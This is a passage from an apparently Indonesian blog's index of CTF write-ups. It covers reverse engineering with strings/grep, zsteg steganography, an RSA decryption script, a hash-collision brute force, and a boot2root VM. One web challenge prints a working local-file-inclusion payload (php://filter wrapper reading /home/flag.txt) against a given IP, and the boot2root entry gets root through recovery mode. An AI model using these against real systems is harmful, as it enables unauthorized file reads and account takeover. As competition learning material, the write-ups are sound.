CTF{123Srypto}\n","date":"2024-10-12T16:54:04+07:00","image":"https://example.com/p/cyber-strike-competition-1.0-ctf-2024-forensic/image-21_hu18180403240042149022.png","permalink":"https://example.com/p/cyber-strike-competition-1.0-ctf-2024-forensic/","title":"[Cyber Strike Competition 1.0 CTF 2024] - Forensic"},{"content":"\nReverse Engineering\nPada soal-soal reverse engineering ini, disini ada ‘celah’ pada setiap soal nya. Celah yang dimaksud yaitu untuk mendapatkan flag nya tanpa harus secara ‘reverse’, jadi cukup dengan melihat isi file nya, dan akan muncul flag nya tanpa harus di reverse engineering. Jadi setiap soal yang saya lakukan untuk mendapatkan flag nya menggunakan cara yang sama.\nSayangnya pada writeup ini dibuat, saya tidak cukup waktu untuk melakukan screenshoot setiap soal-soalnya.\nMystery Dungeon Oke langsung saya disini saya mengecek isi file nya dengan “cat mystery_dungeon”\nDari hasil tersebut, sebenarnya sudah keliatan flag nya, tetapi disini saya pake strings dan grep agar lebih jelas flag nya\nstrings mystery_dungeon | grep \u0026ldquo;CTF{\u0026rdquo;\nDari hasil tersebut, terdapat 2 flag. Tetapi kemungkinan key untuk mendapatkan dari program tersebut yaitu “CTF{give_me_the_key}”. Tetapi untuk memastikan nya, saya coba jalankan program nya\nLalu masukan key nya CTF{give_me_the_key}\nMaka flag nya CTF{hidden_flag_here}\nflag: CTF{hidden_flag_here}\nQuantum Pada soal ini, terdapat 2 file yaitu “key.txt” “quantum_crypt”\nisi key.txt\nisi quantum_crypt\nDari melihat isi file nya, terlihat isi flag nya. Akan tetapi disini saya coba cek lagi dengan strings dan grep\nCTF{quantum_rulez}\nCTF{quantum_is_the_future}\nUntuk memastikan nya, disini saya coba jalankan programnya\nKarna tidak tau nomor berapa untuk membuka secret key nya, disini saya langsung coba melihat flow nya dengan ida64\nSetelah itu scroll kebawah, dan akan terlihat flow nya\nDari flow tersebut, ketika berhasil menemukan nomor nya, maka secret phrase nya yaitu CTF{quantum_rulez}. Dan setelah itu ketika memasukan phrase untuk membuka flag nya, maka flag nya adalah CTF{quantum_is_the_future}.\nFlag: CTF{quantum_is_the_future}\nSimple Check Pada soal ini, hanya ada satu file, yaitu simple_check. Ketika saya coba jalankan, program akan meminta inputan password\nKarna chall ini ada ‘celah’ buat mendapatkan flag nya, jadi cukup menggunakan strings dan grep saja\nYups flag nya ada satu saja\nflag: CTF{easy_password}\nEncrypted Flag Pada soal ini terdapat sebuah file encrypted_flag. Untuk mendapatkan flag nya sama seperti cara yang sebelumnya, yaitu mencoba menjalakan program nya terlebih dahulu\nKarna program nya meminta password, jadi disini saya mencoba mencari flag dengan strings dan grep saja\nCTF{StandByME!!!!}\nUntuk memastikan nya, saya mencoba menjalankan lgi dan memasukan password tadi\nYups hasilnya benar\nflag: CTF{StandByME!!!!}\nTerima kasih CTF Cyber Strike Competition 1.0\nMeskipun masih banyak kekurangan dari beberapa soal yang diberikan nya, tapi masih ada beberapa soal lagi yang menarik dan menambah ilmu bagi saya sendiri.\nMungkin untuk soal kategori reverse tidak segampang itu untuk mendapatkan flag nya, akan tetapi soal-soal yang diberikan nya bagi saya menarik untuk bahan belajar revese engineering untuk mendapatkan flag nya sesungguh nya.\nSekali lagi, Terima kasih :D\n","date":"2024-10-12T16:54:04+07:00","image":"https://example.com/p/cyber-strike-competition-1.0-ctf-2024-reverse/image-63_hu133826188270407513.png","permalink":"https://example.com/p/cyber-strike-competition-1.0-ctf-2024-reverse/","title":"[Cyber Strike Competition 1.0 CTF 2024] - Reverse"},{"content":"\nStegano Eksplorasi Gambar Terenkripsi Pada write up ini dibuat, sayangnya kondisi event ctf pada website nya sudah tutup, sehingga saya lupa untuk melakukan screenshoot soal nya.\nIntinya pada soal kali ini, terdapat sebuah file gambar .png. Untuk mendapatkan flag nya perlu mencari di dalam gambar tersebut. Tampilan dari ctf.png ini hanya berupa tampilan warna putih seperti dibawah berikut:\nDisini hal yang saya lakukan yaitu mengecek informasi pada gambar tersebut, seperti ‘file’, ‘exiftool’, dan ‘strings’.\nDari hasil informasi, sebenarnya tidak ada yang menarik. Tetapi dari informasi tersebut bahwa file ctf.png ini memang benar format PNG.\nLalu saya mencoba mengikuti metode dari stegano-tricks https://book.hacktricks.xyz/crypto-and-stego/stego-tricks\nFokus pada bagian zsteg, karna format file ini yaitu png.\nHasil dari zsteg, dapat menampilkan sebuah flag\nflag: CTF{hidden_flag}\n","date":"2024-10-12T16:54:04+07:00","image":"https://example.com/p/cyber-strike-competition-1.0-ctf-2024-stegano/image-43_hu2765447559310436691.png","permalink":"https://example.com/p/cyber-strike-competition-1.0-ctf-2024-stegano/","title":"[Cyber Strike Competition 1.0 CTF 2024] - Stegano"},{"content":"\nWeb-Exploit File Not Found Pada soal ini, hanya ada link web target dan juga hint untuk path flag nya.\nKetika saya akses web nya, tampilan nya seperti ini:\nTerlihat ada informasi bahwa file tidak ada “file not found”. Tetapi ketika saya ubah parameter nya menjadi /abc, maka tampilan error seperti ini: Berarti file index.php tadi hanya berisi “fake not found”.\nSelain itu pada url target, terlihat seperti vulnerability terhadap local file inclusion”index.php?file=index.php”\nOke disini saya mencoba LFI menggunakan ektension Hackbar, pilih LFI-\u0026gt;Using wrapper-\u0026gt;php://filter\npage=php://filter/read=string.rot13/resource=index.php\npada bagian “page=” diubah menjadi “file=”, sehingga lengkap nya seperti ini\nhttp://103.187.106.138:11101/index.php?file=php://filter/read=string.rot13/resource=index.php\nSetelah di eksekusi, ada tampilan error seperti berikut\nTerlihat juga file path website tersebut, disini saya langsung coba memanggil index.php nya sesuai deksripsi soal “/home/flag.txt”\nhttp://103.187.106.138:11101/index.php?file=php://filter/read=string.rot13/resource=/home/flag.txt\nMuncul flag nya PGS{Y0p4Y_s!Y3!apYhg!0a_} , tetapi ini masih belum terbaca flag aslinya. jadi perlu tahapan nya lagi. Selanjutnya disini saya cek cipher flag nya menggunakan web https://www.dcode.fr/cipher-identifier\nHasil dari cipher identifier, bahwa kemungkinan flag tersebut menggunakan affine cipher.\nselanjutnya disini saya coba decode dengan affine cipher https://www.dcode.fr/affine-cipher\nSekarang coba scroll ke bawah, dan ada flag nya\nflag: CTF{L0c4L_f!L3!ncLut!0n_}\n","date":"2024-10-12T16:54:04+07:00","image":"https://example.com/p/cyber-strike-competition-1.0-ctf-2024-web/image-50_hu2879626430930819879.png","permalink":"https://example.com/p/cyber-strike-competition-1.0-ctf-2024-web/","title":"[Cyber Strike Competition 1.0 CTF 2024] - Web"},{"content":"\nMisc [ Free Flag 4 All ] Soal pertama yang saya kerjakan yaitu soal yg ‘free flag’, karna lumayan buat point petama hehe\nDi dalam deskripsi soal sudah terlihat flag nya.\nflag: 0byteCTF{79_t4hun m3rd3k4_INDONESIA_m4kin_b3rk4ry4}\nCrypto [ Painless RSA ] Executive Summary Di soal ini, terdapat sebuah netcat untuk terhubung ke koneksi soal nya.Ketika saya mencoba menghubungkan nya dengan perintah ‘nc 152.42.176.161 300041’, maka hasilnya seperti berikut:\nDari hasil tersebut, sesuai judul soal nya yaitu soal kriptografi dengan “RSA”. Di RSA ini, biasanya terdapat sebuah parameter utama yaitu modulus “n” dan exponen publik “e”. Parameter tersebut gunanya untuk mengenkripsi data.\nTechnical Report Dilihat hasil dari gambar tadi, ada beberapa ciphertext yaitu “flag-0x1” sampai “flag-0x15”. Ciphertext ini sudah dienkripsi dengan RSA. Untuk mendapatkan flag nya maka bisa dilakukan dengan cara dekripsi ciphernya.\nDisini saya menggunakan program python untuk melakukan dekripsi nya, seperti berikut:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import sympy _# ambil dari hasil netcat tadi_ n = 12702921637381668223 e = 65537 _# Cipher texts_ cipher_texts = [ 8653543177909262164, 8129368878150413257, 10350103832841408363, 7032331030093581600, 4782305598758838406, 2785159304879662933, 2732051847576006533, 11794173093819803751, 11873112032135690728, 9382562734350058402, 579065509642778528, 12332679177220217606, 11536863561057576902, 7642099693399375786, 8458953175633811295 ] _# disini difaktorkan nilai n untuk mendapatkan p dan q_ p, q = sympy.factorint(n).keys() _# menghitung nilai phi(n)_ phi_n = (p - 1) \\* (q - 1) _# menghitung nilai d (private key exponent)_ d = pow(e, -1, phi_n) _# membuat fungsi untuk dekripsi RSA_ def decrypt_rsa(c, d, n): return pow(c, d, n) _# proses meendekripsi cipher texts_ decrypted_flag = [decrypt_rsa(c, d, n) for c in cipher_texts] _# mengkonversi hasil dekripsi ke string ASCII_ flag = \u0026#39;\u0026#39;.join([decrypted_value.to_bytes((decrypted_value.bit_length() + 7) // 8, \u0026#39;big\u0026#39;).decode() for decrypted_value in decrypted_flag]) print(\u0026#34;Flag:\u0026#34;, flag) Pada kode diatas, saya menggunakan library Pythonyaitu sympy untuk memfaktorkan n, kemudian isa mendekripsi setiap bagian dari flag yang diberikan.\nSetelah saya jalankan program nya, maka muncul flag dari soal ini\nflag: Flag: 0byteCTF{Congratz!___Th3_M0st_B4s1c_RSA_1s_s0_34sy_Right?}\nConclusion Di soal ini melibatkan sebuah dekripsi flag yang telah dienkripsi menggunakan algoritma RSA. Selain itu diberikan nilai n (modulus), e (eksponen publik), dan beberapa cipher text (bagian-bagian dari flag yang terenkripsi) ketika menjalankan netcat nya.\nUntuk menyelesaikannya, mencari nilai n terlebih dahulu dengan cara faktorisasi untuk mendapatkan bilangan prima ‘p’ dan ‘n’. Selanjutnya menghitung eksponen private (d) menggunakan rumus phi(n) = (p - 1) * (q - 1), lalu gunakan nilai ‘e’ dan ‘phi(n)’ untuk menghitung eksponen privat d dengan rumus d = e^(-1) mod phi(n). Setelah mendapatkan eksponen private ‘d’nya, maka lanjut dengan deskripsi cipher text dengan rumus ‘m = c^d mod n’. Setelah di deskripsi (dari format numerik), agar flag tersebut bisa terbaca maka dikonversi ke format string.\nBoot2root [ Sembunyi ] Note: Untuk soal ini, setelah saya submit flag tersebut, sialnya saya tidak membaca terlebih dahulu untuk peraturan boot2root ini. Peraturan di boot2root ini tidak boleh dengan cara bypass password root. Jadi cara yg saya lakukan ini salah\nExecutive Summary Di soal ini dengan kategori boot2root, tidak ada hint untuk menyelesaikan flag nya. Hanya terdapat sebuah link soal dan juga password zip. Isi dari link tersebut merupakan file dengan format .7z\nSetelah saya download file arsip tersebut, terdapat sebuah file dengan format .ova\nFormat .ova ini intinya itu sama kayak file ZIP gitu, tapi isinya bukan dokumen atau gambar, melainkan sebuah sistem operasi lengkap dengan aplikasinya, biasanya untuk virtual mesin. Dalam konteks ini, berarti sebuah virtual mesin yang sudah siapkan untuk mencari flag nya. Mesin ini harus dipasang pada laptop/pc masing-masing. Disini saya menggunakan Virtual Box.\nTechnical Report Untuk menyelesaikan flag nya, pertama import file .ova ke software virtual machine, salah satunya virtual box.\nUntuk Caranya di virtualbox, klik file-\u0026gt;Import Appliance-\u0026gt;Lalu masukan file .ova tadi-\u0026gt;klik next-\u0026gt;finish. Maka hasilnya akan seperti berikut\nSetelah itu Lanjut dengan klik Start.\nSetelah mesin nya dijalankan, maka akan menampilkan login server nya\nDisini saya belum tau username dan password, dan di hint juga tidak ditemukan. Untuk mendapatkan flag ini saya mencoba melakukan masuk ke akun root melalui recovery mode.\nUntuk masuk ke recovery mode, caranya mematikan mesin nya terlebih dahulu, setelah itu jalankan kembali mesin nya dan dibarengi dengan tekan shift. Setelah itu masuk ke ‘advance options for ubuntu’, lalu pilih yang recovery mode, dan akan muncul tampilan seperti berikut\nDi recovery menu ini, pilih bagian menu root. Maka akan langsung masuk sebagai root. Selanjut nya saya cek isi user pada mesin dengan cara ‘ls /home’, dan hasilnya terdapat 3 user yaitu ‘bambang’, ‘musaceous’, dan ‘ubuntu’.\nSelanjutnya saya mencoba ganti password dari salah satu user tersebut,awalnya mencoba mengannti user bambang, tetapi ketika login, user bambang ini tiba2 keluar lagi. Lalu saya mencoba user musaceous, tetapi tidak melakukan sudo. Akhirnya saya mencoba mengganti user ubuntu dengan cara ‘passwd ubuntu’.\nSetelah mengganti password, maka keluar dari user root dengan ketik ‘exit’ dan akan ditampilakn kembali recovery menu. Di recover menu pilih ‘resume’ dan klik ‘ok’.\nSetelah itu masuk sebagai ubuntu, dan masukan password nya baru tadi\nSetelah berhasil login, selanjutnya mencari flag pada server dengan menggunakan perintah find dan grep, seperti ‘find /* | grep “flag.txt”\nPerintah tersebut gunanya nyari file yang namanya \u0026ldquo;flag.txt\u0026rdquo; (dari perintah grep “flag.txt”) di SEMUA folder (karna pake /*) di mesin ini. Karna mencari nya di semua folder, maka menggunakan sudo agar tetep bisa akses meskpun folder tersebut hanya bisa diakses oleh root / superuser.\nDari hasil pencarian, terdapat sebuah flag di folder root ‘/root/flag.txt’. Jadi sebenarnya tadi bisa saja langsung akses melalui recover mode, cuman ntah kenapa yang saya lakukan ketika mencoba mengerjakan soal ini saya mencoba mencari nya dengan user terlebih dahulu.\nSekarang tinggal lihat isi flag nya dengan perintah ‘sudo /root/flag.txt’\nterdapat isi flag nya\nflag:0byteCTF{nUS4NT4RA_y4n9_d!SeMBuNY!k4N_de2cd143b4}\nConclusion Kesimpulan dari soal ini sebenarnya kita harus mencari terlebih dahulu network yg digunakan, celah apa yang ada di mesin ini, dan lainnya. Tetapi disini saya salah dengan cara menjawab soal ini, yang saya gunakan untuk menyelesaikan ini lebih tepatnya ketika mau mengganti password/lupa password os linux pada pc/laptop, sehingga mengganti dengan cara recover mode :(\n","date":"2024-08-18T23:19:20+07:00","image":"https://example.com/p/zerobyte-ctf-2024-writeup/image-1_hu13869391008565968301.png","permalink":"https://example.com/p/zerobyte-ctf-2024-writeup/","title":"[ZeroByte CTF 2024] Writeup"},{"content":"ACT_CIAMIS with agrx\nMISC [ Free Flag ] Soal:\nSesuai dengan namanya, soal ini memang memberikan flag secara cuma-cuma. kami langsung memasukkan flag yang tertera pada deskripsi soal, dan ternyata valid!\nFlag: WRECKIT50{just_ch3cking_f0r_y0ur_sani7y}\nCRYPTO [ m4K c0MbL4n6 ] Soal:\nPada soal ini, kami diberikan dua buah file, yaitu propietary.py dan chall.py.\nBerikut adalah isi dari file propietary.py:\npropietary.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 import math def biner_ke_hex(biner): desimal = int(biner, 2) heksadesimal = hex(desimal) return heksadesimal[2:] ​ def float_bin(my_number, places=3): my_whole, my_dec = str(my_number).split(\u0026#34;.\u0026#34;) my_whole = int(my_whole) res = (str(bin(my_whole))+\u0026#34;.\u0026#34;).replace(\u0026#39;0b\u0026#39;,\u0026#39;\u0026#39;) for x in range(places): my_dec = str(\u0026#39;0.\u0026#39;)+str(my_dec) temp = \u0026#39;%1.20f\u0026#39; %(float(my_dec)\\*2) my_whole, my_dec = temp.split(\u0026#34;.\u0026#34;) res += my_whole return res ​ def cyclic_left_shift(value, shift): return ((value \u0026lt;\u0026lt; shift) \u0026amp; 0xFFFFFFFF) | (value \u0026gt;\u0026gt; (32 - shift)) def binary32(n): sign = 0 if n \u0026lt; 0: sign = 1 n = n \\* (-1) p = 30 dec = float_bin(n, places=p) dotPlace = dec.find(\u0026#39;.\u0026#39;) onePlace = dec.find(\u0026#39;1\u0026#39;) if onePlace \u0026gt; dotPlace: dec = dec.replace(\u0026#34;.\u0026#34;,\u0026#34;\u0026#34;) onePlace -= 1 dotPlace -= 1 elif onePlace \u0026lt; dotPlace: dec = dec.replace(\u0026#34;.\u0026#34;,\u0026#34;\u0026#34;) dotPlace -= 1 mantissa = dec[onePlace+1:] exponent = dotPlace - onePlace exponent_bits = exponent + 127 exponent_bits = bin(exponent_bits).replace(\u0026#34;0b\u0026#34;,\u0026#39;\u0026#39;) mantissa = mantissa[0:23] final = str(sign) + exponent_bits.zfill(8) + mantissa return final def parse_input(x): if len(x) != 32: raise ValueError(\u0026#34;Input harus 32-bit string\u0026#34;) xl = x[:12] xm = x[12:28] xr = x[28:] return xl, xm, xr def calculate_parameters(xl, xm, xr): gama_awal = int(xl, 2) \\* (1 / 2\\*\\*12) eta = (int(xm, 2) \\* (2 / 2\\*\\*16)) + 2 k = (int(xr, 2) \\* (1 / 2\\*\\*4)) + 10.01 n = math.floor(6 \\* gama_awal) return gama_awal, eta, k, n ​ def fL(eta, gama_n): return eta _ gama_n _ (1 - gama_n) def gamma_function(gama_awal, eta, k, n, i): gama = gama_awal for i in range(n + i): gama = (2**k / 2**fL(eta, gama)) % 1 return gama ​ def ELM(x): xl, xm, xr = parse_input(x) gama_awal, eta, k, n = calculate_parameters(xl, xm, xr) gama_n1 = gamma_function(gama_awal, eta, k, n, 1) gama_n2 = gamma_function(gama_awal, eta, k, n, 2) w1 = binary32(gama_n1 \\* (10\\*\\*(10))) w2 = binary32(gama_n2) y = (cyclic_left_shift(int(w1,2), 17)) ^ (int(w2,2)) return format(y, \u0026#39;032b\u0026#39;) def transform_f(x): blocks = [x[i:i+32] for i in range(0, 256, 32)] x_prev = \u0026#39;0\u0026#39; \\* 32 for i in range(8): x_curr = blocks[i] blocks[i] = ELM(format(int(x_curr, 2) ^ int(x_prev, 2),\u0026#39;032b\u0026#39;)) x_prev = blocks[i] blocks[0] = format((cyclic_left_shift(int(blocks[0], 2), 19) + (cyclic_left_shift(int(blocks[2], 2), 9) % (2\\*\\*32))), \u0026#39;032b\u0026#39;) blocks[4] = format(cyclic_left_shift(int(blocks[4], 2) ^ cyclic_left_shift(int(blocks[2], 2), 9), 7), \u0026#39;032b\u0026#39;) blocks[5] = format(cyclic_left_shift(int(blocks[5], 2) ^ cyclic_left_shift(int(blocks[3], 2), 17), 13), \u0026#39;032b\u0026#39;) blocks[6] = format((int(blocks[6], 2) + int(blocks[4], 2)) % (2\\*\\*32), \u0026#39;032b\u0026#39;) blocks[7] = format(cyclic_left_shift(int(blocks[7], 2), 11) ^ int(blocks[5], 2), \u0026#39;032b\u0026#39;) blocks[1] = format(int(blocks[1], 2) + int(blocks[5], 2), \u0026#39;032b\u0026#39;) blocks[2] = format(cyclic_left_shift(int(blocks[2], 2), 9) ^ int(blocks[6], 2), \u0026#39;032b\u0026#39;) blocks[3] = format((cyclic_left_shift(int(blocks[3], 2), 17) + int(blocks[1], 2)) % (2\\*\\*32), \u0026#39;032b\u0026#39;) return \u0026#39;\u0026#39;.join(blocks) def convert_to_32bit_hex(input_hex): input_int = int(input_hex[:8], 16) # Ambil 8 digit pertama jika lebih panjang dari 8 digit bit_string = format(input_int, \u0026#39;032b\u0026#39;) # Konversi integer ke 32 bit biner dengan leading zeros return bit_string ​ # Fungsi hash HORTEX def HORTEX(input_hex): X_bin = convert_to_32bit_hex(input_hex) pad_len = (64 - (len(X_bin) % 64)) % 64 X_padded = X_bin + \u0026#39;1\u0026#39; + \u0026#39;0\u0026#39; \\* (pad_len - 1) r, c = 64, 192 state = \u0026#39;0\u0026#39; \\* (r + c) state_int = int(state[:r], 2) block_int = int(X_padded, 2) updated_state = format(state_int ^ block_int, \u0026#39;064b\u0026#39;) + \u0026#39;0\u0026#39;\\*c after_abs = transform_f(updated_state) s0 = transform_f(after_abs) h1 = s0[:r] state = transform_f(s0) h2 = state[:r] h1_hex = format(int(h1, 2), \u0026#39;016x\u0026#39;) h2_hex = format(int(h2, 2), \u0026#39;016x\u0026#39;) return h1_hex + h2_hex Selanjutnya, berikut adalah isi dari file chall.py:\nchall.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from propietary import \\* def print_diagram(): diagram = \u0026#34;\u0026#34;\u0026#34; Sistem Penjodohan oleh Mak Comblang. Semoga cocok :) \u0026#34;\u0026#34;\u0026#34; print(diagram) if **name** == \u0026#34;**main**\u0026#34;: print_diagram() while True: X_hex = input(\u0026#39;choose your man (hex): \u0026#39;) Y_hex = input(\u0026#39;choose your woman (hex): \u0026#39;) hash_value1 = HORTEX(X_hex) hash_value2 = HORTEX(Y_hex) if hash_value1 == hash_value2 and X_hex != Y_hex: print(\u0026#34;New couple is matched :). Here your flag WRECKIT50{REDACTED}\u0026#34;) break else: print(\u0026#34;Try again\u0026#34;) break Dari analisis yang kami lakukan, file propietary.py berisi fungsi-fungsi untuk melakukan hashing dan manipulasi bit yang digunakan dalam algoritma hashing, yaitu \u0026lsquo;HORTEX\u0026rsquo;.\n1 2 3 4 def HORTEX(input_hex): X_bin = convert_to_32bit_hex(input_hex) pad_len = (64 - (len(X_bin) % 64)) % 64 X_padded = X_bin + \u0026#39;1\u0026#39; + \u0026#39;0\u0026#39; \\* (pad_len - 1) Sejujurnya, kami baru pertama kali mendengar tentang HORTEX ini. Setelah mencari informasi, kami menemukan sebuah website yang menjelaskan tentang HORTEX.\nHortex adalah fungsi hash alternatif berbasis chaotic sponge yang diusulkan yang menghasilkan panjang keluaran sebesar 128-bit. Algoritma Hortex diuji dengan menggunakan Cryptographic Randomness Testing (CRT) untuk mengevaluasi sifat keacakan yang dimiliki dan diserang menggunakan serangan kolisi Yuval dan bruteforce secara teoritis untuk mengevaluasi keamanannya. Sumber: https://kc3.poltekssn.ac.id/opac/index.php?p=show_detail\u0026amp;id=11773\u0026amp;keywords=\nDari informasi tersebut, kami mendapatkan sedikit petunjuk, yaitu serangan kolisi (Collision attack) dan brute force.\nFile chall.py merupakan source code yang berjalan pada server dengan alamat IP yang diberikan.\nJika dilihat dari source code chall.py, program meminta dua inputan nilai dalam bentuk heksadesimal dari user, yaitu pada variabel X_hex dan Y_hex.\n1 2 X_hex = input(\u0026#39;choose your man (hex): \u0026#39;) Y_hex = input(\u0026#39;choose your woman (hex): \u0026#39;) Kedua inputan tersebut kemudian di-hash menggunakan fungsi HORTEX.\n1 2 hash_value1 = HORTEX(X_hex) hash_value2 = HORTEX(Y_hex) Setelah di-hash, program akan mengecek apakah nilai hash dari X_hex sama dengan Y_hex. Jika kedua hash tersebut sama dan nilai asli dari X_hex tidak sama dengan (!=) Y_hex, maka program akan menampilkan flag.\n1 2 3 if hash_value1 == hash_value2 and X_hex != Y_hex: print(\u0026#34;New couple is matched :). Here your flag WRECKIT50{REDACTED}\u0026#34;) break Artinya, pada soal ini, kami harus menemukan dua nilai heksadesimal yang berbeda, tetapi menghasilkan nilai hash yang sama menggunakan fungsi HORTEX.\nJadi, kesimpulannya, propietary.py berfungsi untuk menghitung hash \u0026lsquo;HORTEX\u0026rsquo;, dan chall.py berfungsi untuk menerima inputan user dan mencari collision pada fungsi hash HORTEX. Setelah itu, program akan menampilkan flag apabila dua input menghasilkan hash yang sama.\nUntuk mendapatkan flag, kami harus mencari collision atau hash yang sama. Untuk mencarinya, kami menggunakan metode brute force sesuai dengan petunjuk yang kami dapatkan sebelumnya. Brute force di sini berarti mencoba berbagai kombinasi input dan melihat apakah hasilnya sama.\nUntuk melakukan brute force, kami menggunakan script bruteforce.py berikut:\nbruteforce.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from propietary import HORTEX def find_collision(): seen_hashes = {} for i in range(2**16): # menggunakan rentang 2-16 agar efisiensi X_hex = format(i, \u0026#39;08x\u0026#39;) # Format menjadi hex 8 digit hash_value = HORTEX(X_hex) if hash_value in seen_hashes: print(f\u0026#34;Collision found:\u0026#34;) print(f\u0026#34;X_hex: {seen_hashes[hash_value]}\u0026#34;) print(f\u0026#34;Y_hex: {X_hex}\u0026#34;) print(f\u0026#34;Hash: {hash_value}\u0026#34;) return seen_hashes[hash_value], X_hex seen_hashes[hash_value] = X_hex print(\u0026#34;No collision found.\u0026#34;) return None find_collision() Setelah menjalankan script tersebut, kami mendapatkan hasil sebagai berikut:\nDari hasil brute force, kami mendapatkan nilai X_hex dan Y_hex. Selanjutnya, kami mencoba memasukkan inputan tersebut ke dalam program chall.py.\nSetelah menunggu beberapa saat, akhirnya kami berhasil mendapatkan flag!\nFlag: WRECKIT50{fUnCt10n_Sh0uLd_nOt_13Ij3cT1On}\nSELESAI! Sebenarnya, ada banyak soal lain yang sudah kami coba, tetapi kami selalu mengalami kesulitan pada tahap akhir, seperti menemukan file zip yang dienkripsi dengan password. Hanya satu soal ini yang berhasil kami pecahkan dengan metode brute force.\nTerima kasih Wreck IT 5.0! Soal-soalnya sangat menantang dan membuat kami mendapatkan banyak ilmu baru.\n","date":"2024-08-10T15:42:50+07:00","image":"https://example.com/p/wreck-it-5.0-ctf-writeup/image-1_hu12506500408679058889.png","permalink":"https://example.com/p/wreck-it-5.0-ctf-writeup/","title":"[Wreck-IT 5.0 CTF] Writeup"}]